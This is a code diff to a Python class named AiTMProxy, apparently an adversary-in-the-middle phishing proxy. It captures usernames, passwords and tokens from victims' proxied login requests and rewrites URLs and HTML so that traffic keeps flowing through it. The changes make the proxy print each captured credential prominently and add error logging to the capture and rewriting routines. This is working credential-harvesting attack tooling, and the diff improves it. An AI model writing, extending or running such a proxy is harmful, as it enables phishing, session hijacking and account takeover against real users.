@@ -301,9 +301,11 @@ class AiTMProxy:
                         captured[key] = values[0] if values else ""
             
             if captured:
-                print(f"[AiTM] Credentials captured for session {session_id}: {captured}")
+                print(f"🎯 [AiTM] CREDENTIALS CAPTURED for session {session_id}:")
                 for k, v in captured.items():
+                    print(f"   🔑 {k}: {v}")
                     self.session_manager.capture_credential(session_id, k, v)
+                print("🎯" + "="*50)
                     
         except Exception as e:
             print(f"[AiTM Warning] Failed to parse POST body: {e}")
@@ -332,7 +334,8 @@ class AiTMProxy:
                     print(f"[AiTM] Tokens captured for session {session_id}: {captured}")
                     for k, v in captured.items():
                         self.session_manager.capture_credential(session_id, k, v)
-        except:
+        except Exception as e:
+            print(f"Warning: Credential capture failed: {e}")
             pass
 
 
@@ -428,7 +431,6 @@ class AiTMProxy:
             if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
                 return f"{proxy_base_path}{url}"
             if proxy_base_path == "/v5/proxy":
-                from urllib.parse import quote
                 return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
             # Default: path-only
             return url
@@ -445,7 +447,6 @@ class AiTMProxy:
                 path = parsed.path or ""
                 if parsed.query:
                     # If queries exist, fall back to query-style to preserve semantics
-                    from urllib.parse import quote
                     encoded = quote(url, safe='/?&=')
                     return f"{proxy_base_path}?url={encoded}"
                 return f"{proxy_base_path}{path}"
@@ -453,25 +454,20 @@ class AiTMProxy:
             is_ws = url.startswith(("ws://", "wss://"))
             endpoint = "/ws" if is_ws else ""
             if proxy_base_path == "/v5/proxy":
-                from urllib.parse import quote
                 encoded = quote(url, safe='/?&=')
                 return f"{proxy_base_path}{endpoint}?url={encoded}"
             # Default: path-only (preserve query)
             return (parsed.path or url) + (f"?{parsed.query}" if parsed.query else "")
         
         # Handle relative non-root URLs (e.g., "socket")
-        try:
-            full_upstream_url = urljoin(base_url, url)
-            if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
-                parsed = urlparse(full_upstream_url)
-                return f"{proxy_base_path}{parsed.path}"
-            if proxy_base_path == "/v5/proxy":
-                return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
-            # Default path-only (preserve query)
+        full_upstream_url = urljoin(base_url, url)
+        if proxy_base_path and proxy_base_path.startswith("/v5/p/"):
             parsed = urlparse(full_upstream_url)
-            return (parsed.path or url) + (f"?{parsed.query}" if parsed.query else "")
-        except Exception:
-            return url
+            return f"{proxy_base_path}{parsed.path}"
+        if proxy_base_path == "/v5/proxy":
+            return f"{proxy_base_path}?url={quote(full_upstream_url, safe='/?&=')}"
+        parsed = urlparse(full_upstream_url)
+        return (parsed.path or url) + (f"?{parsed.query}" if parsed.query else "")
 
     def rewrite_html(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
         """
@@ -565,7 +561,8 @@ class AiTMProxy:
             text = import_pattern.sub(replace_import, text)
             
             return text.encode('utf-8')
-        except:
+        except Exception as e:
+            print(f"Warning: HTML rewrite failed: {e}")
             return content
 
     def rewrite_json(self, content: bytes, base_url: str, proxy_base_path: str = "") -> bytes:
